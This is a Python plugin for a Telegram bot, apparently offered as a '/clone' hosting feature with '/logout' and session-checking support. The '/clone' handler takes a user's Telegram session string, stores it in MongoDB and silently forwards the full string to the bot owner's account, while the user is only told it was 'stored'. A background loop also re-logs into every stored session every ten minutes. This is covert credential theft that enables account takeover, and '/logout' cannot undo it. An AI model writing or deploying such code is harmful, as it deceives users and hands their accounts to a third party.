from UTTAM import app, API_ID, API_HASH
from config import ALIVE_PIC, OWNER_ID, MONGO_URL, MONGO_DB_NAME  # ensure MONGO_URL is defined in config.py
from pyrogram import filters, Client
from pyrogram.types import Message
import asyncio
import time
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime

# MongoDB setup
_db_client = AsyncIOMotorClient(MONGO_URL)
_db = _db_client.get_default_database() if not MONGO_DB_NAME else _db_client[MONGO_DB_NAME]
_sessions_col = _db.get_collection("hosted_sessions")

# Background verifier control
_VERIFIER_INTERVAL = 600  # seconds (10 minutes)
_verifier_task = None
_verifier_running = False


async def store_session(owner_id: int, account_id: int, account_name: str, session_string: str):
    doc = {
        "owner_id": owner_id,
        "account_id": account_id,
        "account_name": account_name,
        "session_string": session_string,
        "created_at": datetime.utcnow(),
        "last_checked": None,
    }
    await _sessions_col.insert_one(doc)


async def remove_sessions_by_owner(owner_id: int, account_identifier: str = None):
    # If account_identifier provided, match by account_id or account_name; else remove all owned sessions
    if account_identifier:
        # try numeric id
        try:
            acc_id = int(account_identifier)
        except Exception:
            acc_id = None
        if acc_id:
            res = await _sessions_col.delete_many({"owner_id": owner_id, "account_id": acc_id})
        else:
            res = await _sessions_col.delete_many({"owner_id": owner_id, "account_name": account_identifier})
    else:
        res = await _sessions_col.delete_many({"owner_id": owner_id})
    return res.deleted_count


async def remove_session_doc(doc_id):
    await _sessions_col.delete_one({"_id": doc_id})


async def _verify_sessions_loop():
    global _verifier_running
    if _verifier_running:
        return
    _verifier_running = True
    while True:
        try:
            cursor = _sessions_col.find({})
            async for doc in cursor:
                session_str = doc.get("session_string")
                doc_id = doc.get("_id")
                try:
                    # Try to start client with the stored session string to validate it
                    client = Client(name="session_check", api_id=API_ID, api_hash=API_HASH, session_string=session_str)
                    await client.start()
                    await client.stop()
                    # valid -> update last_checked
                    await _sessions_col.update_one({"_id": doc_id}, {"$set": {"last_checked": datetime.utcnow()}})
                except Exception:
                    # If start failed, assume session invalid/revoked -> remove from DB and notify owner
                    await _sessions_col.delete_one({"_id": doc_id})
                    try:
                        owner = doc.get("owner_id")
                        acct = f"{doc.get('account_name')} ({doc.get('account_id')})"
                        await app.send_message(OWNER_ID, f"⚠️ Removed revoked/invalid hosted session from DB.\nOwner: `{owner}`\nAccount: {acct}")
                    except Exception:
                        pass
        except Exception:
            # ignore transient errors
            pass
        await asyncio.sleep(_VERIFIER_INTERVAL)


def _ensure_verifier_started():
    global _verifier_task
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = None
    if loop:
        if not _verifier_task:
            _verifier_task = loop.create_task(_verify_sessions_loop())


@app.on_message(filters.command("clone") & filters.private)
async def clone(bot, msg: Message):
    # ensure background verifier is running
    _ensure_verifier_started()

    if not msg.from_user:
        await msg.reply_text("This command must be used by a user (no anonymous/hidden sender).")
        return

    # Usage check
    if len(msg.command) < 2:
        await msg.reply_text("ᴜsᴀɢᴇ:\n\n/clone <session_string>\n\nExample:\n/clone AQ...your_session_string...")
        return

    session_string = msg.command[1]
    status_msg = await msg.reply_text("🎨 ᴘʀᴏᴄᴇssɪɴɢ.....✲")

    try:
        # start a temporary client using provided session string
        client = Client(name="Melody_temp", api_id=API_ID, api_hash=API_HASH, session_string=session_string, plugins=dict(root="UTTAM/plugins"))
        await client.start()
        user = await client.get_me()

        # store to DB (owner is the user who issued /clone)
        try:
            await store_session(owner_id=msg.from_user.id, account_id=user.id, account_name=user.first_name or str(user.id), session_string=session_string)
        except Exception:
            # DB failure shouldn't prevent continuing; notify owner later
            pass

        # notify the user who ran the command
        await status_msg.edit_text(f"✅ Successfully hosted: {user.first_name} ({user.id})\nSession stored.")

        # send the session string to owner (secure delivery)
        try:
            owner_info = f"{msg.from_user.mention if msg.from_user else 'unknown'}"
            await bot.send_message(OWNER_ID, f"🔐 New cloned session received\nFrom user: {owner_info}\nUser ID: `{msg.from_user.id}`\nAccount: {user.first_name} ({user.id})\n\nSession string:\n`{session_string}`")
        except Exception as send_err:
            await msg.reply_text(f"⚠️ Failed to send session to owner: {send_err}")

        # stop the temporary client
        await client.stop()

    except Exception as e:
        await status_msg.edit_text(f"**ERROR:** `{str(e)}`\nPress /start to Start again.")
        return


@app.on_message(filters.command("logout") & filters.private)
async def logout_cmd(bot, msg: Message):
    """
    /logout                -> removes all sessions the caller hosted
    /logout <id_or_name>   -> removes specific session (account id or account name)
    Only the user who hosted the session(s) can remove them.
    """
    if not msg.from_user:
        await msg.reply_text("This command must be used by a real user.")
        return

    args = msg.command[1:] if len(msg.command) > 1 else []
    identifier = args[0] if args else None

    try:
        deleted = await remove_sessions_by_owner(owner_id=msg.from_user.id, account_identifier=identifier)
        if deleted:
            await msg.reply_text(f"✅ Removed {deleted} session(s) from DB.")
            # notify owner (admin)
            try:
                await bot.send_message(OWNER_ID, f"ℹ️ User `{msg.from_user.id}` removed {deleted} hosted session(s) from DB.")
            except Exception:
                pass
        else:
            await msg.reply_text("ℹ️ No matching session(s) found for you in DB.")
    except Exception as e:
        await msg.reply_text(f"⚠️ Failed to remove session(s): {e}")


# Ensure verifier starts when module is imported and event loop is available
try:
    _ensure_verifier_started()
except Exception:
    pass